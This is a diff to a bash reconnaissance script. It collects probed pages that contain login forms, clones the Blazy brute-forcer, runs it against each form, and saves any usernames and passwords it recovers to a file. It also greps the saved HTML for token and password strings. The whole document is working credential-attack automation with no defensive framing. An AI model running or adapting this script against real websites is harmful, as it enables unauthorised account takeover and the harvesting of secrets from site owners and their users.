@@ -1,6 +1,30 @@
 #!/bin/bash
 output=$output
 cd $output/3_html
+
+rg -l form *.html | sort -u | awk -F"." '{print $1}' > login.txt
+for line in `cat login.txt`
+do
+head -$line /root/script/3_httprobe/httprobe.txt |tail -1 >> form.txt
+done
+rm login.txt
+
+rm -r Blazy
+git clone https://github.com/s0md3v/Blazy
+cd Blazy
+
+for line in `cat $output/3_html/form.txt`
+do
+result=`echo "$line" | python blazy.py | grep -oP "Password:"`
+if [ $result != "" ]
+then
+echo $line >> $output/4_password.txt
+echo "$line" | python blazy.py | grep -E "Password:|Username:" >> $output/4_password.txt
+fi
+done
+rm $output/3_html/form.txt
+
+cd $output/3_html
 rg  -oPHn  ".................................token .................................................." *.html >> $output/4_html_grep.txt
 rg  -oPHn  ".................................pwd .................................................." *.html >> $output/4_html_grep.txt
 rg  -oPHn  ".................................pwd:.................................................." *.html >> $output/4_html_grep.txt
